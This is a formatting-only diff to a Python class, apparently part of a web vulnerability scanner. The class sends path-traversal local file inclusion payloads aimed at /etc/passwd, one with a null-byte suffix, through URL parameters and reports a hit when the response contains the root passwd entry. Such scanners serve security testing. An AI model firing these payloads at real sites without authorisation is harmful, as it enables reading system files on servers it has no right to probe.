@@ -58,7 +58,7 @@ class TestLFI:
             r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
             + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
             r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
-            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
+            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
         ]
 
     def exploit_lfi(self, base_url, url_params) -> None:
@@ -72,21 +72,16 @@ class TestLFI:
                     test_url = f"{main_url}={test}"
                 else:
                     continue
-                
+
                 try:
                     response = get(test_url)
                 except ConnectionError:
                     self.log.logger(
-                        "error",
-                        f"Connection error raised on: {test_url}, skipping"
+                        "error", f"Connection error raised on: {test_url}, skipping"
                     )
                     continue
                 else:
-                    if (
-                        response.text.find(
-                                "root:x:0:0:root:/root"
-                            ) != -1
-                        ):
+                    if response.text.find("root:x:0:0:root:/root") != -1:
                         self.console.print(
                             f"[red][[/red][green]+[/green][red]][/red]"
                             + f" [white]LFI :[/white] {test_url}"
